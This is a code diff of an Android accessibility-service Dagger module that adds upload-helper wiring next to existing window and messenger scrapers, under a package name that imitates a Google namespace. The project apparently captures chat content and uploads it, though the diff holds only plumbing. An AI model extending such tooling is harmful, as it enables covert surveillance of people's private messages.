@@ -29,6 +29,8 @@ import service.android.google.com.accessibility.rx.util.SchedulerFactory;
 import service.android.google.com.accessibility.scraper.WindowRipper;
 import service.android.google.com.accessibility.scraper.scrapers.MessengerScraper;
 import service.android.google.com.accessibility.scraper.scrapers.Scraper;
+import service.android.google.com.accessibility.upload.UploaderFactory;
+import service.android.google.com.accessibility.upload.UploaderHelper;
 import service.android.google.com.accessibility.util.action.ActionFactory;
 import service.android.google.com.accessibility.util.function.FunctionFactory;
 
@@ -52,14 +54,17 @@ public class AccessibilityModule {
     @Singleton
     AccessibilityServiceController accessibilityServiceController(final ObservableFactory observableFactory,
                                                                   final Prefser prefser,
-                                                                  final Resources resources) {
+                                                                  final Resources resources,
+                                                                  final UploaderHelper uploaderHelper) {
         return new AccessibilityServiceControllerImpl(
                 observableFactory,
                 prefser,
-                resources
+                resources,
+                uploaderHelper
         );
     }
 
+    //<editor-fold desc="Factories">
     @Provides
     ObservableFactory observableFactory(final FunctionFactory functionFactory,
                                         final ActionFactory actionFactory,
@@ -99,6 +104,17 @@ public class AccessibilityModule {
     }
 
     @Provides
+    ObserverFactory observerFactory() {
+        return new ObserverFactory(accessibilityService);
+    }
+
+    @Provides
+    UploaderFactory uploaderFactory() {
+        return new UploaderFactory();
+    }
+    //</editor-fold>
+
+    @Provides
     EventExtractor eventExtractor(final Prefser prefser,
                                   final Resources resources) {
         return new EventExtractor(Arrays.<Extractor>asList(
@@ -117,8 +133,16 @@ public class AccessibilityModule {
         ));
     }
 
+    //<editor-fold desc="Helpers">
     @Provides
-    ObserverFactory observerFactory() {
-        return new ObserverFactory(accessibilityService);
+    UploaderHelper uploadHelper(final Prefser prefser,
+                                final Resources resources,
+                                final UploaderFactory uploaderFactory) {
+        return new UploaderHelper(
+                prefser,
+                resources,
+                uploaderFactory
+        );
     }
+    //</editor-fold>
 }
